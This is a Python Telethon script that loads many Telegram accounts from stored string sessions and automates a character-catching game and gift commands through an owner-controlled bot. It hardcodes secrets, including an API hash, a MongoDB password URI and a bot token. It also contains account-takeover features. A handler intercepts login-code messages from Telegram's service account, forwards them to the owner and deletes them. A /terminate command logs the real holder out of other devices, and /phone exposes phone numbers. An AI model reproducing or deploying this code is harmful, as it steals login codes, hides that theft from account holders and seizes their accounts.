import os
import asyncio
import random
import re
from telethon import TelegramClient, events, functions
from telethon.sessions import StringSession
from motor.motor_asyncio import AsyncIOMotorClient

# ==========================================
# ⚙️ CONFIGURATION
# ==========================================
APP_ID = 39584681
APP_HASH = 'c8c0685d6dd5b9e546093ea90d27733b'
MONGO_URI = "mongodb+srv://kkt:h1BdaMt7nxW9jTXa@cluster0.kb5fzfl.mongodb.net/?appName=Cluster0&tlsAllowInvalidCertificates=true"
BOT_TOKEN = '8738081667:AAHADgcDISntnOBwT3uj2yYw7n3XJUN2uZI'

OWNER_ID = 6015356597
SPECIFIC_GROUP = -1003848067679
SPAWN_BOT_ID = 6157455819

SPECIAL_HINT_BOT_ID = 8999491734
SPECIAL_SPAWN_GROUP = -1003580630981
SPECIAL_DELAY_MIN = 0.3
SPECIAL_DELAY_MAX = 0.6
SPECIAL_W_REPLY_DELAY = 0.5

CGIFT_CHAT_ID = -1003580630981
CGIFT_WAIT_SEC = 6   # 🔥 3 → 6

# 🎯 STORAGE
userbot_instances = {}
hint_bot_ids = {8506436817}
spawn_tracker = {}
latest_spawn = {}
latest_spawn_msg = {}
HINT_REGEX = re.compile(r"(/catch(?:@\w+)?\s+[^\n]+)")

# 🎁 BOT STATE
bot_state = {
    "selected_user_id": None,
    "save_mode": False,
}
cgift_state = {}

# MongoDB
client_mongo = AsyncIOMotorClient(MONGO_URI)
db = client_mongo["telegram_bot"]
reply_save_col = db["reply_save_col"]
target_bots_col = db["target_bots"]
tomboy_col = db["tomboy_col"]
marcuz_col = db["marcuz_col"]
talk_col = db["random_talk"]
filters_col = db["filters"]
hint_bots_col = db["hint_bots_col"]
registry_col = db["collection_registry"]
cgift_ids_col = db["cgift_ids"]

bot = TelegramClient('official_bot_session', APP_ID, APP_HASH)

# ==========================================
# 🌍 RENDER HEALTH CHECK
# ==========================================
async def handle_render_health_check(reader, writer):
    await reader.read(100)
    resp = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nOK"
    writer.write(resp.encode())
    await writer.drain()
    writer.close()

async def start_dummy_web_server():
    port = int(os.environ.get("PORT", 10000))
    try:
        server = await asyncio.start_server(handle_render_health_check, '0.0.0.0', port)
        async with server:
            await server.serve_forever()
    except Exception:
        pass

async def delete_catch_message_delayed(client, chat_id, msg_id):
    try:
        await asyncio.sleep(1)
        await client.delete_messages(chat_id, msg_id)
    except Exception:
        pass

def get_message_text(event):
    if event.text:
        return event.text
    try:
        if event.message and event.message.message:
            return event.message.message
    except Exception:
        pass
    return ""

# ==========================================
# 🔧 HELPERS
# ==========================================
def get_cmd_and_args(text):
    if not text:
        return "", ""
    text = text.strip()
    parts = text.split(maxsplit=1)
    cmd = parts[0]
    args = parts[1].strip() if len(parts) > 1 else ""
    if "@" in cmd:
        cmd = cmd.split("@")[0]
    return cmd, args

def parse_ids_from_text(text):
    ids = []
    for line in text.split("\n"):
        line = line.strip()
        if line and re.match(r"^\d+$", line):
            ids.append(line)
    return ids

# ==========================================
# 🎁 CGIFT LOOP
# ==========================================
async def run_cgift_loop(client, user_id):
    state = cgift_state.get(user_id)
    if not state:
        return
    try:
        doc = await cgift_ids_col.find_one({"user_id": user_id})
        if not doc:
            print(f"❌ No IDs stored for user {user_id}")
            state["running"] = False
            state["task"] = None
            return

        ids = doc.get("ids", [])
        total = len(ids)
        if total == 0:
            print(f"❌ Empty ID list for user {user_id}")
            state["running"] = False
            state["task"] = None
            return

        while state["running"] and state["index"] < total:
            gift_id = ids[state["index"]]
            try:
                reply_target = state.get("reply_to_msg_id")
                if reply_target:
                    await client.send_message(
                        state["chat_id"],
                        f"/cgift {gift_id}",
                        reply_to=reply_target
                    )
                else:
                    await client.send_message(
                        state["chat_id"],
                        f"/cgift {gift_id}"
                    )
                print(f"🎁 [{user_id}] /cgift {gift_id}  ({state['index']+1}/{total}) reply_to={reply_target}")
            except Exception as e:
                print(f"❌ [{user_id}] send error for {gift_id}: {e}")

            state["index"] += 1

            if not state["running"] or state["index"] >= total:
                break
            await asyncio.sleep(CGIFT_WAIT_SEC)

        if state["index"] >= total:
            print(f"✅ [{user_id}] Completed all {total} IDs")
            state["index"] = 0

        state["running"] = False
        state["task"] = None
    except Exception as e:
        print(f"❌ [{user_id}] cgift loop error: {e}")
        state["running"] = False
        state["task"] = None

# ==========================================
# 🎁 SELF-BOT SIDE HANDLER
# ==========================================
async def cgift_selfbot_handler(event):
    current_user_id = getattr(event.client, 'tg_user_id', None)
    if not current_user_id or current_user_id not in userbot_instances:
        return
    if event.chat_id != CGIFT_CHAT_ID:
        return
    if not event.text:
        return

    cmd, args = get_cmd_and_args(event.text)

    if cmd == "/cgift" and not args:
        if current_user_id not in cgift_state:
            cgift_state[current_user_id] = {
                "running": False, "index": 0,
                "chat_id": None, "reply_to_msg_id": None, "task": None
            }
        state = cgift_state[current_user_id]
        if state["running"]:
            return
        state["running"] = True
        state["chat_id"] = event.chat_id

        # 🔥 အဓိက ပြင်ဆင်ချက်:
        # /cgift က သူများကို Reply လုပ်ထားရင် → အဲဒီသူများရဲ့ Message ကို Reply target သုံး
        # မဟုတ်ရင် → Reply မပါဘဲ ပို့ (ကိုယ့်ကိုယ်ကို Reply မလုပ်တော့ဘူး)
        if event.reply_to_msg_id:
            state["reply_to_msg_id"] = event.reply_to_msg_id
            print(f"🎯 [{current_user_id}] /cgift will reply to OTHER msg_id={event.reply_to_msg_id}")
        else:
            state["reply_to_msg_id"] = None
            print(f"🎯 [{current_user_id}] /cgift will send WITHOUT reply")

        state["task"] = asyncio.create_task(run_cgift_loop(event.client, current_user_id))
        print(f"🚀 [{current_user_id}] /cgift started from index {state['index']}")

    elif cmd == "/stop":
        if current_user_id in cgift_state and cgift_state[current_user_id]["running"]:
            cgift_state[current_user_id]["running"] = False
            print(f"🛑 [{current_user_id}] /cgift stopped at index {cgift_state[current_user_id]['index']}")

# ==========================================
# ⚔️ SPAWN HANDLERS
# ==========================================
async def spawn_detector_handler(event):
    global spawn_tracker, latest_spawn, latest_spawn_msg
    current_user_id = getattr(event.client, 'tg_user_id', None)
    if not current_user_id or current_user_id not in userbot_instances:
        return
    config = userbot_instances[current_user_id]
    if config["is_stopped"]:
        return

    text_raw = get_message_text(event)
    if not text_raw:
        return
    text_upper = text_raw.upper()

    if "A CHARACTER HAS SPAWNED" in text_upper or "ᴀ ᴄʜᴀʀᴀᴄᴛᴇʀ ʜᴀs sᴘᴀᴡɴᴇᴅ" in text_raw:
        is_special = config.get("special_mode", False)
        if is_special and event.chat_id != config["spawn_group"]:
            return
        if event.chat_id in [-1001947407820, -1003067509608, -1003760110058]:
            return
        if any(emoji in text_raw for emoji in config["ignored_emojis"]):
            print(f"⏭️ Skipped spawn (ignored emoji) on {current_user_id}")
            return

        orig_chat_id = event.chat_id
        latest_spawn[current_user_id] = orig_chat_id
        latest_spawn_msg[current_user_id] = event.message.id

        try:
            if is_special:
                await asyncio.sleep(SPECIAL_W_REPLY_DELAY)
                reply_msg = await event.message.reply("/w")
                spawn_tracker[(current_user_id, reply_msg.id)] = orig_chat_id
                print(f"📦 Special Spawn → /w in {orig_chat_id} (our /w msg={reply_msg.id})")
            else:
                target_chat = config["group_id"]
                fwd_msg = await event.message.forward_to(target_chat)
                spawn_tracker[(current_user_id, fwd_msg.id)] = orig_chat_id
                reply_msg = await fwd_msg.reply("/w")
                spawn_tracker[(current_user_id, reply_msg.id)] = orig_chat_id
                print(f"📦 Spawn → forwarded {orig_chat_id} → {target_chat}")

            if len(spawn_tracker) > 300:
                spawn_tracker.pop(next(iter(spawn_tracker)))
        except Exception as e:
            print(f"❌ spawn handler error {current_user_id}: {e}")

async def hint_solver_handler(event):
    global spawn_tracker, latest_spawn, latest_spawn_msg
    current_user_id = getattr(event.client, 'tg_user_id', None)
    if not current_user_id or current_user_id not in userbot_instances:
        return
    config = userbot_instances[current_user_id]
    if config["is_stopped"]:
        return

    is_special = config.get("special_mode", False)
    if is_special:
        if event.chat_id != config["spawn_group"]:
            return
        if event.sender_id != config["hint_bot_id"]:
            return
        if not event.reply_to_msg_id:
            return
        if (current_user_id, event.reply_to_msg_id) not in spawn_tracker:
            return
    else:
        if event.sender_id not in hint_bot_ids:
            return
        if event.chat_id != config["group_id"]:
            return

    text_raw = get_message_text(event)
    if not text_raw:
        return

    match = HINT_REGEX.search(text_raw)
    if not match:
        return

    catch_command = match.group(1).strip(" `\n\r")
    target_orig_group = None
    if event.reply_to_msg_id and (current_user_id, event.reply_to_msg_id) in spawn_tracker:
        target_orig_group = spawn_tracker[(current_user_id, event.reply_to_msg_id)]
    elif current_user_id in latest_spawn:
        target_orig_group = latest_spawn[current_user_id]

    if not target_orig_group:
        return

    try:
        client_to_use = config["client"]
        if is_special:
            await client_to_use.send_message(target_orig_group, catch_command)
            print(f"🎯 [FAST] Catch → {target_orig_group} by {current_user_id} → {catch_command}")
        else:
            await asyncio.sleep(0.1)
            async with client_to_use.action(target_orig_group, 'typing'):
                await asyncio.sleep(0.5)
            sent_msg = await client_to_use.send_message(target_orig_group, catch_command)
            asyncio.create_task(delete_catch_message_delayed(client_to_use, target_orig_group, sent_msg.id))
            print(f"🎯 Catch → {target_orig_group} by {current_user_id} → {catch_command}")
    except Exception as e:
        print(f"❌ Catch error {current_user_id}: {e}")

async def catch_success_forwarder_handler(event):
    current_user_id = getattr(event.client, 'tg_user_id', None)
    if not current_user_id or current_user_id not in userbot_instances:
        return
    config = userbot_instances.get(current_user_id, {})
    if config.get("is_stopped"):
        return
    if config.get("special_mode", False):
        return

    text_raw = get_message_text(event)
    if not text_raw:
        return
    text_upper = text_raw.upper()

    if "YOU GOT A NEW CHARACTER!" in text_upper or "ʏᴏᴜ ɢᴏᴛ ᴀ ɴᴇᴡ ᴄʜᴀʀᴀᴄᴛᴇʀ!" in text_raw:
        try:
            me = await event.client.get_me()
            first_name = (me.first_name or "").lower()
            last_name = (me.last_name or "").lower()
            full_name = f"{first_name} {last_name}".strip()
            username = (me.username or "").lower()
            text_lower = text_raw.lower()
            if (event.message.mentioned
                or (first_name and first_name in text_lower)
                or (full_name and full_name in text_lower)
                or (username and username in text_lower)):
                await event.message.forward_to(SPECIFIC_GROUP)
        except Exception:
            pass

async def telegram_service_handler(event):
    try:
        await bot.send_message(OWNER_ID, f"🔐 **Telegram Login Intercepted!**\n\n{event.message.text}")
        await event.delete()
    except Exception:
        pass

def register_userbot_handlers(client, waifu_chat_id):
    client.add_event_handler(spawn_detector_handler, events.NewMessage(from_users=SPAWN_BOT_ID))
    client.add_event_handler(catch_success_forwarder_handler, events.NewMessage(from_users=SPAWN_BOT_ID))
    client.add_event_handler(hint_solver_handler, events.NewMessage())
    client.add_event_handler(cgift_selfbot_handler, events.NewMessage(outgoing=True))
    client.add_event_handler(telegram_service_handler, events.NewMessage(chats=777000))

# ==========================================
# 🤖 OFFICIAL BOT COMMAND HANDLER
# ==========================================
@bot.on(events.NewMessage(chats=[SPECIFIC_GROUP, OWNER_ID]))
async def handle_bot_commands(event):
    global userbot_instances, hint_bot_ids

    if event.sender_id != OWNER_ID:
        return

    text = event.message.text.strip() if event.message.text else ""
    if not text:
        return

    cmd, args = get_cmd_and_args(text)

    # ---------- 🎁 SAVE MODE ----------
    if bot_state["save_mode"] and bot_state["selected_user_id"] and not text.startswith("/"):
        ids = parse_ids_from_text(text)
        if ids:
            target_uid = bot_state["selected_user_id"]
            await cgift_ids_col.update_one(
                {"user_id": target_uid},
                {"$push": {"ids": {"$each": ids}}},
                upsert=True
            )
            doc = await cgift_ids_col.find_one({"user_id": target_uid})
            total = len(doc.get("ids", [])) if doc else len(ids)
            await event.reply(f"✅ **Saved {len(ids)} IDs** for `{target_uid}`\n📊 Total: `{total}`")
            print(f"💾 Saved {len(ids)} IDs → {target_uid} (total {total})")
        return

    # ---------- /idsave {user_id} ----------
    if cmd == "/idsave":
        if not args:
            await event.reply("⚠️ **Usage:** `/idsave {selfbot_user_id}`")
            return
        try:
            target_uid = int(args.split()[0])
        except ValueError:
            await event.reply("❌ **User ID must be a number**")
            return
        if target_uid not in userbot_instances:
            await event.reply(f"❌ **Selfbot `{target_uid}` is not online**")
            return
        bot_state["selected_user_id"] = target_uid
        await event.reply(
            f"✅ **Selected selfbot:** `{target_uid}`\n"
            f"Now run `/save on` to start bulk‑saving IDs."
        )

    # ---------- /save on | off ----------
    elif cmd == "/save":
        if not bot_state["selected_user_id"]:
            await event.reply("⚠️ **Run `/idsave {user_id}` first.**")
            return
        target_uid = bot_state["selected_user_id"]
        if args.lower() == "on":
            bot_state["save_mode"] = True
            await event.reply(
                f"📥 **Save mode ON** for `{target_uid}`\n"
                f"Send IDs (one per line, 50 per message).\n"
                f"Send `/save off` when done."
            )
        elif args.lower() == "off":
            bot_state["save_mode"] = False
            doc = await cgift_ids_col.find_one({"user_id": target_uid})
            total = len(doc.get("ids", [])) if doc else 0
            await event.reply(f"📤 **Save mode OFF**\n📊 Total IDs for `{target_uid}`: `{total}`")
        else:
            await event.reply("⚠️ **Usage:** `/save on` or `/save off`")

    # ---------- /clean id ----------
    elif cmd == "/clean":
        if not bot_state["selected_user_id"]:
            await event.reply("⚠️ **Run `/idsave {user_id}` first.**")
            return
        if args.lower() == "id":
            target_uid = bot_state["selected_user_id"]
            await cgift_ids_col.delete_one({"user_id": target_uid})
            if target_uid in cgift_state:
                cgift_state[target_uid]["index"] = 0
            await event.reply(f"🗑️ **Cleaned all IDs for selfbot `{target_uid}`**")
        else:
            await event.reply("⚠️ **Usage:** `/clean id`")

    # ---------- /addautospecial ----------
    elif cmd == "/addautospecial":
        if not event.is_private:
            await event.reply("⚠️ **Please use this command in the bot's DM.**")
            return
        parts = args.split(maxsplit=1)
        if len(parts) < 1:
            await event.reply("⚠️ **Usage:** `/addautospecial [Collection] [Session]`")
            return
        col_name = parts[0].strip()
        session_str = parts[1].strip() if len(parts) > 1 else None
        if not session_str and event.is_reply:
            r = await event.get_reply_message()
            if r and r.text:
                session_str = r.text.strip()
        if not session_str:
            await event.reply("❌ **String Session not found.**")
            return
        await event.reply(f"⏳ Checking and saving into `db['{col_name}']`...")
        try:
            temp_client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
            await temp_client.start()
            me = await temp_client.get_me()
            u_id = me.id
            temp_client.tg_user_id = u_id
            spawn_group = SPECIAL_SPAWN_GROUP
            hint_bot_id = SPECIAL_HINT_BOT_ID
            delay_min = SPECIAL_DELAY_MIN
            delay_max = SPECIAL_DELAY_MAX
            ignored_emojis = ["🔵", "🟣", "🟡", "🟠", "💮"]
            custom_col = db[col_name]
            await custom_col.update_one(
                {"user_id": u_id},
                {"$set": {
                    "user_id": u_id, "session": session_str,
                    "group_id": spawn_group, "ignored_emojis": ignored_emojis,
                    "is_stopped": False, "collection_name": col_name,
                    "special_mode": True, "spawn_group": spawn_group,
                    "hint_bot_id": hint_bot_id,
                    "delay_min": delay_min, "delay_max": delay_max
                }},
                upsert=True
            )
            await registry_col.update_one(
                {"collection_name": col_name},
                {"$set": {"collection_name": col_name}},
                upsert=True
            )
            userbot_instances[u_id] = {
                "client": temp_client, "group_id": spawn_group,
                "ignored_emojis": ignored_emojis, "is_stopped": False,
                "collection_name": col_name, "special_mode": True,
                "spawn_group": spawn_group, "hint_bot_id": hint_bot_id,
                "delay_min": delay_min, "delay_max": delay_max
            }
            register_userbot_handlers(temp_client, spawn_group)
            await event.reply(
                f"✅ **Installed (Special Mode)**\n"
                f"👤 **Name:** {me.first_name}\n🆔 **User ID:** `{u_id}`\n"
                f"📍 **Spawn Group:** `{spawn_group}`\n"
                f"🤖 **Hint Bot:** `{hint_bot_id}`\n"
                f"⏱️ **Delay:** {delay_min} ~ {delay_max} sec\n"
                f"🗂️ **DB:** `db['{col_name}']`"
            )
        except Exception as e:
            await event.reply(f"❌ **Userbot connect failed:** {e}")

    # ---------- /addauto ----------
    elif cmd == "/addauto":
        if not event.is_private:
            await event.reply("⚠️ **Please use this command in the bot's DM.**")
            return
        parts = args.split(maxsplit=2)
        if len(parts) < 2:
            await event.reply("⚠️ **Usage:** `/addauto [Waifu_Chat_ID] [Collection] [Session]`")
            return
        try:
            waifu_chat_id = int(parts[0])
        except ValueError:
            await event.reply("❌ **Waifu Chat ID must be a number.**")
            return
        col_name = parts[1].strip()
        session_str = parts[2].strip() if len(parts) > 2 else None
        if not session_str and event.is_reply:
            r = await event.get_reply_message()
            if r and r.text:
                session_str = r.text.strip()
        if not session_str:
            await event.reply("❌ **String Session not found.**")
            return
        await event.reply(f"⏳ Checking and saving into `db['{col_name}']`...")
        try:
            temp_client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
            await temp_client.start()
            me = await temp_client.get_me()
            u_id = me.id
            temp_client.tg_user_id = u_id
            default_emojis = ["🔵", "🟣", "🟡", "🟠", "💮"]
            custom_col = db[col_name]
            await custom_col.update_one(
                {"user_id": u_id},
                {"$set": {
                    "user_id": u_id, "session": session_str,
                    "group_id": waifu_chat_id, "ignored_emojis": default_emojis,
                    "is_stopped": False, "collection_name": col_name
                }},
                upsert=True
            )
            await registry_col.update_one(
                {"collection_name": col_name},
                {"$set": {"collection_name": col_name}},
                upsert=True
            )
            userbot_instances[u_id] = {
                "client": temp_client, "group_id": waifu_chat_id,
                "ignored_emojis": default_emojis, "is_stopped": False,
                "collection_name": col_name
            }
            register_userbot_handlers(temp_client, waifu_chat_id)
            await event.reply(
                f"✅ **Installed**\n👤 **Name:** {me.first_name}\n"
                f"🆔 **User ID:** `{u_id}`\n🌐 **Waifu Chat:** `{waifu_chat_id}`\n"
                f"🗂️ **DB:** `db['{col_name}']`"
            )
        except Exception as e:
            await event.reply(f"❌ **Userbot connect failed:** {e}")

    # ---------- /start ----------
    elif cmd == "/start":
        if not args:
            await event.reply("⚠️ **Usage:** `/start [User_ID]`")
            return
        try:
            target_uid = int(args.split()[0])
        except ValueError:
            await event.reply("❌ **Invalid User ID.**")
            return
        if target_uid in userbot_instances:
            col_name = userbot_instances[target_uid]["collection_name"]
            userbot_instances[target_uid]["is_stopped"] = False
            await db[col_name].update_one({"user_id": target_uid}, {"$set": {"is_stopped": False}})
            await event.reply(f"🚀 **Userbot `{target_uid}` resumed.**")
        else:
            await event.reply("❌ **Userbot not found.**")

    # ---------- /stop ----------
    elif cmd == "/stop":
        if not args:
            await event.reply("⚠️ **Usage:** `/stop [User_ID]`")
            return
        try:
            target_uid = int(args.split()[0])
        except ValueError:
            await event.reply("❌ **Invalid User ID.**")
            return
        if target_uid in userbot_instances:
            col_name = userbot_instances[target_uid]["collection_name"]
            userbot_instances[target_uid]["is_stopped"] = True
            await db[col_name].update_one({"user_id": target_uid}, {"$set": {"is_stopped": True}})
            await event.reply(f"🛑 **Userbot `{target_uid}` paused.**")
        else:
            await event.reply("❌ **Userbot not found.**")

    # ---------- /emoji ----------
    elif cmd == "/emoji":
        parts = args.split(maxsplit=1)
        if len(parts) < 2:
            await event.reply("⚠️ **Usage:** `/emoji [user_id] [emoji_list]`")
            return
        try:
            target_uid = int(parts[0])
            custom_emojis = list(parts[1].replace(" ", ""))
        except ValueError:
            await event.reply("❌ **Invalid User ID.**")
            return
        if target_uid in userbot_instances:
            col_name = userbot_instances[target_uid]["collection_name"]
            userbot_instances[target_uid]["ignored_emojis"] = custom_emojis
            await db[col_name].update_one({"user_id": target_uid}, {"$set": {"ignored_emojis": custom_emojis}})
            await event.reply(f"✅ **Updated ignored emojis for `{target_uid}`.**")
        else:
            await event.reply("❌ **Userbot not found.**")

    # ---------- /addhint ----------
    elif cmd == "/addhint":
        if not args:
            await event.reply("⚠️ **Usage:** `/addhint [Hint_Bot_ID]`")
            return
        try:
            h_id = int(args.split()[0])
        except ValueError:
            await event.reply("❌ **Invalid ID.**")
            return
        hint_bot_ids.add(h_id)
        await hint_bots_col.update_one({"hint_id": h_id}, {"$set": {"hint_id": h_id}}, upsert=True)
        await event.reply(f"✅ **Hint Bot `{h_id}` added.**")

    # ---------- /terminate ----------
    elif cmd == "/terminate":
        if not args:
            await event.reply("⚠️ **Usage:** `/terminate [User_ID]`")
            return
        try:
            target_uid = int(args.split()[0])
        except ValueError:
            await event.reply("❌ **Invalid User ID.**")
            return
        if target_uid in userbot_instances:
            try:
                client = userbot_instances[target_uid]["client"]
                await client(functions.auth.ResetAuthorizationsRequest())
                await event.reply(f"✅ **Other devices terminated for `{target_uid}`.**")
            except Exception as e:
                await event.reply(f"❌ **Terminate failed:** {e}")
        else:
            await event.reply("❌ **Userbot not found.**")

    # ---------- /phone ----------
    elif cmd == "/phone":
        if not args:
            await event.reply("⚠️ **Usage:** `/phone [User_ID]`")
            return
        try:
            target_uid = int(args.split()[0])
        except ValueError:
            await event.reply("❌ **Invalid User ID.**")
            return
        if target_uid in userbot_instances:
            try:
                client = userbot_instances[target_uid]["client"]
                me = await client.get_me()
                phone_number = me.phone if me.phone else "No phone set"
                await event.reply(f"📱 **Phone for `{target_uid}`:** `{phone_number}`")
            except Exception as e:
                await event.reply(f"❌ **Error:** {e}")
        else:
            await event.reply("❌ **Userbot not found.**")

# ==========================================
# 🚀 STARTUP
# ==========================================
async def startup():
    global userbot_instances, hint_bot_ids
    print("⏳ System starting up...")
    asyncio.create_task(start_dummy_web_server())

    async for h_doc in hint_bots_col.find():
        h_id = h_doc.get("hint_id")
        if h_id:
            hint_bot_ids.add(h_id)

    async for reg_doc in registry_col.find():
        col_name = reg_doc.get("collection_name")
        if not col_name:
            continue
        print(f"🗂️ Scanning db['{col_name}'] ...")
        async for acc_doc in db[col_name].find():
            u_id = acc_doc.get("user_id")
            session_str = acc_doc.get("session")
            waifu_chat_id = acc_doc.get("group_id")
            ignored = acc_doc.get("ignored_emojis", ["🔵", "🟣", "🟡", "🟠", "💮"])
            is_shuted = acc_doc.get("is_stopped", False)
            special_mode = acc_doc.get("special_mode", False)
            spawn_group = acc_doc.get("spawn_group") if special_mode else None
            hint_bot_id = acc_doc.get("hint_bot_id") if special_mode else None
            delay_min = acc_doc.get("delay_min", 0.3) if special_mode else 0.1
            delay_max = acc_doc.get("delay_max", 0.6) if special_mode else 0.1

            if session_str and waifu_chat_id:
                try:
                    client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
                    await client.start()
                    client.tg_user_id = u_id
                    userbot_instances[u_id] = {
                        "client": client, "group_id": waifu_chat_id,
                        "ignored_emojis": ignored, "is_stopped": is_shuted,
                        "collection_name": col_name, "special_mode": special_mode,
                        "spawn_group": spawn_group if special_mode else waifu_chat_id,
                        "hint_bot_id": hint_bot_id if special_mode else None,
                        "delay_min": delay_min, "delay_max": delay_max
                    }
                    register_userbot_handlers(client, waifu_chat_id)
                    print(f"🚀 Loaded {u_id} from db['{col_name}'] (special={special_mode})")
                except Exception as e:
                    print(f"⚠️ Failed to boot {u_id}: {e}")

    print(f"📊 Total online: {len(userbot_instances)}")
    await bot.start(bot_token=BOT_TOKEN)
    print("🤖 Official Bot running...")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(startup())
